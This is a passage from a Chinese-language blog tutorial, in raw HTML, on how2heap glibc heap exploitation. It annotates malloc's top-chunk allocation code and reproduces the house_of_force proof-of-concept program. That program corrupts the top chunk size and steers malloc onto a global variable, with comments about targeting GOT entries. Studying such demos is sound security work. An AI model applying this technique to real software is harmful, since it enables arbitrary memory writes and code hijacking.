our fake chunk will</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>\t<span class=\"token comment\">//pass the size(P) == prev_size(next_chunk(P)) test. </span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>\t<span class=\"token comment\">//otherwise we need to make sure that our fake chunk is up against the</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>\t<span class=\"token comment\">//wilderness</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"\\nNow we can call malloc() and it will begin in our fake chunk\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>\td <span class=\"token operator\">=</span> <span class=\"token function\">malloc</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x200</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Next malloc(0x200) is at %p\\n\"</span><span class=\"token punctuation\">,</span> d<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>最后申请了一个 0x200 大小的空间，打印了其地址</p>\n<p><img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/how2heap/MZIV4ZU%400FNBPFBTU%240TPW6.png\" alt=\"\" /></p>\n<p>打印的地址也是 <code>fake_chunk</code>  的 data 域，虽然还是不知道为什么在 pwndbg 的 heap 命令没有显示申请的这个堆</p>\n<p><img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/how2heap/%28IE%29LUZ%7E%7BM0%7E7%7BAFL%29ACT0T.png\" alt=\"\" /></p>\n<h3 id=\"11程序运行结果\"><a class=\"anchor\" href=\"#11程序运行结果\">#</a> 11. 程序运行结果：</h3>\n<p><img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/how2heap/35%405P8LKBI_K%25M8%5B%7D%40UTRV5.png\" alt=\"\" /></p>\n<h1 id=\"5house_of_force\"><a class=\"anchor\" href=\"#5house_of_force\">#</a> 5. <code>house_of_force</code></h1>\n<p>与 <code>house_of_einherjar</code>  不同在于： <code>house_of_einherjar</code>  触发的合并将 topchunk 变得很大，而 <code>house_of_force</code>  是修改 topchunk 的 size 位来变得很大，不过最后都是因为很大的 chunk 可以申请到任意地址</p>\n<p>这个例子是修改 topchunk 的 size 导致我们可以申请部分不用的空间，使下一次申请的空间为我们想要的地方，这就造成了任意地址改写，但是需要通过修改 top chunk 的 size 位来实现</p>\n<p>下面是从 top chunk 申请空间的检测 ( <code>后面调试的步骤5就是绕过这个检测</code> ) 在源码 2728 行：</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">/* finally, do the allocation */</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>  p <span class=\"token operator\">=</span> av<span class=\"token operator\">-></span>top<span class=\"token punctuation\">;</span><span class=\"token comment\">//p 指向当前 top chunk</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  size <span class=\"token operator\">=</span> <span class=\"token function\">chunksize</span> <span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 获取 top chunk 的 size</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>  <span class=\"token comment\">/* check that one of the above allocation paths succeeded */</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token comment\">// 这里的 nb 是要从 top chunk 申请的 chunk 大小（包括头部的 0x10）</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token comment\">//MINSIZE 是一个 chunk 需要的最小的空间（32 位 0x10，64 位 0x20，为 pre_size,size,fd,bk）</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">(</span>size<span class=\"token punctuation\">)</span> <span class=\"token operator\">>=</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">(</span>nb <span class=\"token operator\">+</span> MINSIZE<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span> <span class=\"token comment\">//if 是判断 保障 top chunk 去掉这个 nb chunk 后仍然有一个最小 chunk 大小的空间</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>      remainder_size <span class=\"token operator\">=</span> size <span class=\"token operator\">-</span> nb<span class=\"token punctuation\">;</span> <span class=\"token comment\">//top chunk 剩余大小</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>      remainder <span class=\"token operator\">=</span> <span class=\"token function\">chunk_at_offset</span> <span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">,</span> nb<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>  <span class=\"token comment\">// 得到新 top chunk 的头部地址</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>      av<span class=\"token operator\">-></span>top <span class=\"token operator\">=</span> remainder<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>        <span class=\"token comment\">// 下面的 set_heap 是设置切割出去的 chunk 和新 top chunk 的 size</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>      <span class=\"token function\">set_head</span> <span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">,</span> nb <span class=\"token operator\">|</span> PREV_INUSE <span class=\"token operator\">|</span> <span class=\"token punctuation\">(</span>av <span class=\"token operator\">!=</span> <span class=\"token operator\">&amp;</span>main_arena <span class=\"token operator\">?</span> NON_MAIN_ARENA <span class=\"token operator\">:</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>      <span class=\"token function\">set_head</span> <span class=\"token punctuation\">(</span>remainder<span class=\"token punctuation\">,</span> remainder_size <span class=\"token operator\">|</span> PREV_INUSE<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>      <span class=\"token function\">check_malloced_chunk</span> <span class=\"token punctuation\">(</span>av<span class=\"token punctuation\">,</span> p<span class=\"token punctuation\">,</span> nb<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">// 作用不明。。。</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>      <span class=\"token keyword\">return</span> <span class=\"token function\">chunk2mem</span> <span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 返回用户指针</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><h2 id=\"1程序源码-3\"><a class=\"anchor\" href=\"#1程序源码-3\">#</a> 1. 程序源码：</h2>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">/*</pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>   This PoC works also with ASLR enabled.</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>   It will overwrite a GOT entry so in order to apply exactly this technique RELRO must be disabled.</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>   If RELRO is enabled you can always try to return a chunk on the stack as proposed in Malloc Des Maleficarum </pre></td></tr><tr><td data-num=\"6\"></td><td><pre>   ( http://phrack.org/issues/66/10.html )</pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>   Tested in Ubuntu 14.04, 64bit, Ubuntu 18.04</pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>*/</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdio.h></span></span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdint.h></span></span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdlib.h></span></span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;string.h></span></span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdint.h></span></span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;malloc.h></span></span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;assert.h></span></span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token keyword\">char</span> bss_var<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token string\">\"This is a string that we want to overwrite.\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token keyword\">int</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> argc <span class=\"token punctuation\">,</span> <span class=\"token keyword\">char</span><span class=\"token operator\">*</span> argv<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>\t<span class=\"token function\">fprintf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stderr</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"\\nWelcome to the House of Force\\n\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>\t<span class=\"token function\">fprintf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stderr</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"The idea of House of Force is to overwrite the top chunk and let the malloc return an arbitrary value.\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>\t<span class=\"token function\">fprintf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stderr</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"The top chunk is a special chunk. Is the last in memory \"</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>\t\t<span class=\"token string\">\"and is the chunk that will be resized when malloc asks for more space from the os.\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>\t<span class=\"token function\">fprintf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stderr</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"\\nIn the end, we will use this to overwrite a variable at %p.\\n\"</span><span class=\"token punctuation\">,</span> bss_var<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>\t<span class=\"token function\">fprintf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stderr</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"Its current value is: %s\\n\"</span><span class=\"token punctuation\">,</span> bss_var<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre></pre></td></tr><tr><td data-num=\"33\"></td><td><pre></pre></td></tr><tr><td data-num=\"34\"></td><td><pre></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>\t<span class=\"token function\">fprintf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stderr</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"\\nLet's allocate the first chunk, taking space from the wilderness.\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>\t<span class=\"token class-name\">intptr_t</span> <span class=\"token operator\">*</span>p1 <span class=\"token operator\">=</span> <span class=\"token function\">malloc</span><span class=\"token punctuation\">(</span><span class=\"token number\">256</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>\t<span class=\"token function\">fprintf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stderr</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"The chunk of 256 bytes has been allocated at %p.\\n\"</span><span class=\"token punctuation\">,</span> p1 <span class=\"token operator\">-</span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>\t<span class=\"token function\">fprintf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stderr</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"\\nNow the heap is composed of two chunks: the one we allocated and the top chunk/wilderness.\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>\t<span class=\"token keyword\">int</span> real_size <span class=\"token operator\">=</span> <span class=\"token function\">malloc_usable_size</span><span class=\"token punctuation\">(</span>p1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>\t<span class=\"token function\">fprintf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stderr</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"Real size (aligned and all that jazz) of our allocated chunk is %ld.\\n\"</span><span class=\"token punctuation\">,</span> real_size <span class=\"token operator\">+</span> <span class=\"token keyword\">sizeof</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">long</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>\t<span class=\"token function\">fprintf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stderr</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"\\nNow let's emulate a vulnerability that can overwrite the header of the Top Chunk\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>\t<span class=\"token comment\">//----- VULNERABILITY ----</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>\t<span class=\"token class-name\">intptr_t</span> <span class=\"token operator\">*</span>ptr_top <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">intptr_t</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span>p1 <span class=\"token operator\">+</span> real_size <span class=\"token operator\">-</span> <span class=\"token keyword\">sizeof</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">long</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">//??</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>\t<span class=\"token function\">fprintf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stderr</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"\\nThe top chunk starts at %p\\n\"</span><span class=\"token punctuation\">,</span> ptr_top<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>\t<span class=\"token function\">fprintf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stderr</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"\\nOverwriting the top chunk size with a big value so we can ensure that the malloc will never call mmap.\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>\t<span class=\"token function\">fprintf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stderr</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"Old size of top chunk %#llx\\n\"</span><span class=\"token punctuation\">,</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span> <span class=\"token keyword\">long</span> <span class=\"token keyword\">int</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span>ptr_top <span class=\"token operator\">+</span> <span class=\"token keyword\">sizeof</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">long</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>\t<span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">intptr_t</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span>ptr_top <span class=\"token operator\">+</span> <span class=\"token keyword\">sizeof</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">long</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=</span> <span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre>\t<span class=\"token function\">fprintf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stderr</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"New size of top chunk %#llx\\n\"</span><span class=\"token punctuation\">,</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span> <span class=\"token keyword\">long</span> <span class=\"token keyword\">int</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span>ptr_top <span class=\"token operator\">+</span> <span class=\"token keyword\">sizeof</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">long</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>\t<span class=\"token comment\">//------------------------</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre></pre></td></tr><tr><td data-num=\"55\"></td><td><pre>\t<span class=\"token function\">fprintf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stderr</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"\\nThe size of the wilderness is now gigantic. We can allocate anything without malloc() calling mmap.\\n\"</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre>\t   <span class=\"token string\">\"Next, we will allocate a chunk that will get us right up against the desired region (with an integer\\n\"</span></pre></td></tr><tr><td data-num=\"57\"></td><td><pre>\t   <span class=\"token string\">\"overflow) and will then be able to allocate a chunk right over the desired region.\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre></pre></td></tr><tr><td data-num=\"59\"></td><td><pre>\t<span class=\"token comment\">/*</pre></td></tr><tr><td data-num=\"60\"></td><td><pre>\t * The evil_size is calulcated as (nb is the number of bytes requested + space for metadata):</pre></td></tr><tr><td data-num=\"61\"></td><td><pre>\t * new_top = old_top + nb</pre></td></tr><tr><td data-num=\"62\"></td><td><pre>\t * nb = new_top - old_top</pre></td></tr><tr><td data-num=\"63\"></td><td><pre>\t * req + 2sizeof(long) = new_top - old_top</pre></td></tr><tr><td data-num=\"64\"></td><td><pre>\t * req = new_top - old_top - 2sizeof(long)</pre></td></tr><tr><td data-num=\"65\"></td><td><pre>\t * req = dest - 2sizeof(long) - old_top - 2sizeof(long)</pre></td></tr><tr><td data-num=\"66\"></td><td><pre>\t * req = dest - old_top - 4*sizeof(long)</pre></td></tr><tr><td data-num=\"67\"></td><td><pre>\t */</span></pre></td></tr><tr><td data-num=\"68\"></td><td><pre>\t<span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span> evil_size <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span><span class=\"token punctuation\">)</span>bss_var <span class=\"token operator\">-</span> <span class=\"token keyword\">sizeof</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">long</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token number\">4</span> <span class=\"token operator\">-</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span><span class=\"token punctuation\">)</span>ptr_top<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"69\"></td><td><pre>\t<span class=\"token function\">fprintf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stderr</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"\\nThe value we want to write to at %p, and the top chunk is at %p, so accounting for the header size,\\n\"</span></pre></td></tr><tr><td data-num=\"70\"></td><td><pre>\t   <span class=\"token string\">\"we will malloc %#lx bytes.\\n\"</span><span class=\"token punctuation\">,</span> bss_var<span class=\"token punctuation\">,</span> ptr_top<span class=\"token punctuation\">,</span> evil_size<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"71\"></td><td><pre>\t<span class=\"token keyword\">void</span> <span class=\"token operator\">*</span>new_ptr <span class=\"token operator\">=</span> <span class=\"token function\">malloc</span><span class=\"token punctuation\">(</span>evil_size<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"72\"></td><td><pre>\t<span class=\"token function\">fprintf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stderr</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"As expected, the new pointer is at the same place as the old top chunk: %p\\n\"</span><span class=\"token punctuation\">,</span> new_ptr <span class=\"token operator\">-</span> <span class=\"token keyword\">sizeof</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">long</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"73\"></td><td><pre></pre></td></tr><tr><td data-num=\"74\"></td><td><pre>\t<span class=\"token keyword\">void</span><span class=\"token operator\">*</span> ctr_chunk <span class=\"token operator\">=</span> <span class=\"token function\">malloc</span><span class=\"token punctuation\">(</span><span class=\"token number\">100</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"75\"></td><td><pre>\t<span class=\"token function\">fprintf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stderr</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"\\nNow, the next chunk we overwrite will point at our target buffer.\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"76\"></td><td><pre>\t<span class=\"token function\">fprintf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stderr</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"malloc(100) => %p!\\n\"</span><span class=\"token punctuation\">,</span> ctr_chunk<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"77\"></td><td><pre>\t<span class=\"token function\">fprintf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stderr</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"Now, we can finally overwrite that value:\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"78\"></td><td><pre></pre></td></tr><tr><td data-num=\"79\"></td><td><pre>\t<span class=\"token function\">fprintf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stderr</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"... old string: %s\\n\"</span><span class=\"token punctuation\">,</span> bss_var<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"80\"></td><td><pre>\t<span class=\"token function\">fprintf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stderr</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"... doing strcpy overwrite with \\\"YEAH!!!\\\"...\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"81\"></td><td><pre>\t<span class=\"token function\">strcpy</span><span class=\"token punctuation\">(</span>ctr_chunk<span class=\"token punctuation\">,</span> <span class=\"token string\">\"YEAH!!!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"82\"></td><td><pre>\t<span class=\"token function\">fprintf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stderr</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"... new string: %s\\n\"</span><span class=\"token punctuation\">,</span> bss_var<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"83\"></td><td><pre></pre></td></tr><tr><td data-num=\"84\"></td><td><pre>\t<span class=\"token function\">assert</span><span class=\"token punctuation\">(</span>ctr_chunk <span class=\"token operator\">==</span> bss_var<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"85\"></td><td><pre></pre></td></tr><tr><td data-num=\"86\"></td><td><pre></pre></td></tr><tr><td data-num=\"87\"></td><td><pre>\t<span class=\"token comment\">// some further discussion:</span></pre></td></tr><tr><td data-num=\"88\"></td><td><pre>\t<span class=\"token comment\">//fprintf(stderr, \"This controlled malloc will be called with a size parameter of evil_size = malloc_got_address - 8 - p2_guessed\\n\\n\");</span></pre></td></tr><tr><td data-num=\"89\"></td><td><pre>\t<span class=\"token comment\">//fprintf(stderr, \"This because the main_arena->top pointer is setted to current av->top + malloc_size \"</span></pre></td></tr><tr><td data-num=\"90\"></td><td><pre>\t<span class=\"token comment\">//\t\"and we \\nwant to set this result to the address of malloc_got_address-8\\n\\n\");</span></pre></td></tr><tr><td data-num=\"91\"></td><td><pre>\t<span class=\"token comment\">//fprintf(stderr, \"In order to do this we have malloc_got_address-8 = p2_guessed + evil_size\\n\\n\");</span></pre></td></tr><tr><td data-num=\"92\"></td><td><pre>\t<span class=\"token comment\">//fprintf(stderr, \"The av->top after this big malloc will be setted in this way to malloc_got_address-8\\n\\n\");</span></pre></td></tr><tr><td data-num=\"93\"></td><td><pre>\t<span class=\"token comment\">//fprintf(stderr, \"After that a new call to malloc will return av->top+8 ( +8 bytes for the header ),\"</span></pre></td></tr><tr><td data-num=\"94\"></td><td><pre>\t<span class=\"token comment\">//\t\"\\nand basically return a chunk at (malloc_got_address-8)+8 = malloc_got_address\\n\\n\");</span></pre></td></tr><tr><td data-num=\"95\"></td><td><pre></pre></td></tr><tr><td data-num=\"96\"></td><td><pre>\t<span class=\"token comment\">//fprintf(stderr, \"The large chunk with evil_size has been allocated here 0x%08x\\n\",p2);</span></pre></td></tr><tr><td data-num=\"97\"></td><td><pre>\t<span class=\"token comment\">//fprintf(stderr, \"The main_arena value av->top has been setted to malloc_got_address-8=0x%08x\\n\",malloc_got_address);</span></pre></td></tr><tr><td data-num=\"98\"></td><td><pre></pre></td></tr><tr><td data-num=\"99\"></td><td><pre>\t<span class=\"token comment\">//fprintf(stderr, \"This last malloc will be served from the remainder code and will return the av->top+8 injected before\\n\");</span></pre></td></tr><tr><td data-num=\"100\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>这个示例是将一个全局变量给复写了，也提到了 <code>This PoC works also with ASLR enabled.But this technique RELRO must be disabled</code>  也就是说如果想要修改 got 表，就不能开启 RELRO</p>\n<h2 